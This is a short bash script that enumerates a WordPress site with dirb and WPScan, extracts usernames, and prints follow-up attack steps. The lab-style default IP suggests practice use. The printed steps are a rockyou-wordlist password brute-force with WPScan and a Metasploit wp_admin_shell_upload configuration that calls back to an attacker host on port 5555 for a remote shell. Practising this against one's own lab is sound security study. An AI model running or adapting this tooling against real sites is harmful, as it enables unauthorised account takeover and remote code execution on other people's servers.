#!/bin/bash
# wp_enum.sh — WordPress Enumeration Helper
# Usage: ./wp_enum.sh <TARGET_IP> [WP_PATH]
TARGET=${1:-"192.168.56.103"}
WP_PATH=${2:-"/wordpress"}
URL="http://$TARGET$WP_PATH"
OUTPUT="./wp_enum_output"
mkdir -p "$OUTPUT"

echo "============================================"
echo "  WordPress Enumeration Helper"
echo "  Target: $URL"
echo "============================================"

# 1. dirb
echo -e "\n[*] Phase 1: Directory crawling with dirb"
dirb "http://$TARGET/" -o "$OUTPUT/dirb.txt" 2>/dev/null
echo "[+] dirb done → $OUTPUT/dirb.txt"

# 2. WPScan basic
echo -e "\n[*] Phase 2: WPScan enumeration"
wpscan --url "$URL/" -e at -e ap -e u --output "$OUTPUT/wpscan_enum.txt" 2>/dev/null
echo "[+] WPScan enum done"

# 3. Extract username
grep "^\[+\]" "$OUTPUT/wpscan_enum.txt" 2>/dev/null | grep -v "http" | head -20
echo ""
echo "[*] To brute-force, run:"
echo "    wpscan --url $URL/ -U <username> -P /usr/share/wordlists/rockyou.txt"
echo ""
echo "[*] To exploit with Metasploit after getting credentials:"
echo "    use exploit/unix/webapp/wp_admin_shell_upload"
echo "    set RHOST $TARGET"
echo "    set TARGETURI $WP_PATH"
echo "    set LHOST <YOUR_KALI_IP>   # cek dengan: ip a"
echo "    set LPORT 5555"
